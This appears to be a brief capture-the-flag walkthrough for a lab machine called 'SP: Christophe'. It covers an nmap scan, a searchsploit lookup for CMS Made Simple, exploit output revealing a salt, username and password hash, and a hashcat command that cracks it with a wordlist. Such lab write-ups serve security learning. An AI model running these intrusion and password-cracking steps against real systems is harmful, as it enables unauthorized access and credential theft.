# SP: Christophe (V1.0.2)

![image](https://user-images.githubusercontent.com/5285547/125982486-dc67b351-b5df-4e28-9973-9de19ff391fe.png)

## Nmap 

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```


## CMS Made Simple
![image](https://user-images.githubusercontent.com/5285547/125982400-47f6763c-774a-4277-b48f-ca0770546ab8.png)

```
searchsploit "cms made simple"
```
![image](https://user-images.githubusercontent.com/5285547/125983683-849c0a35-68be-4a6d-a5d2-66a5aadd3b38.png)





```
[+] Salt for password found: 932129a6bd8545bd
[+] Username found: christophe
[+] Email found: christophe@christophe.local
[+] Password found: 7908b1494f82ed320b288a0e839bfbc5
```

Crack the password

```
hashcat -O -a 0 -m 20 7908b1494f82ed320b288a0e839bfbc5:932129a6bd8545bd /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```
